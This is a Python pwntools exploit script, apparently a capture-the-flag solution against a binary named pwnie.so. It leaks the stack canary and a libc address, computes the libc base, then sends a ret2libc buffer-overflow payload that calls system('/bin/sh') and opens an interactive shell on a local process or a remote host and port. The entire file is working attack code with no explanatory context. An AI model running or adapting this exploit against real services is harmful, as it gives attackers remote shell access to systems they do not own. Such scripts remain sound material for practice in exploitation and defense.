#!/usr/bin/env python

from pwn import *
import sys

def exploit(r):

	payload = '13 1'		# leak canary

	r.sendline(payload)

	r.recvuntil('Sorry was supposed to be ')
	canary = int(r.recvline().strip()) & 0xffffffff
	log.info("Canary: " + hex(canary))

#	__libc_start_main
	payload = '40 1'
	r.sendline(payload)
	r.recvuntil('Sorry was supposed to be ')
	libc_start_main = int(r.recvline().strip()) & 0xffffffff
	log.info("__libc_start_main: " + hex(libc_start_main))

	libc_base = libc_start_main - 9 - 0x000199e0
	system = libc_base + 0x0003fe70
	bin_sh = libc_base + 0x15da8c

	libc_base_local = libc_start_main - 9 - 0x19a00
	system_local = libc_base_local + 0x40310
	bin_sh_local = libc_base_local + 0x16084c


	payload = '1 1'
	r.sendline(payload)
	r.recvuntil('Yea you cool.')

	payload = "A" * 10
	payload += p32(canary)
	payload += "B" * 12
	payload += p32(system)
	payload += p32(bin_sh) * 2
	r.sendline(payload)



	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/hackon/pwnie.so'])
        print util.proc.pidof(r)
        pause()
        exploit(r)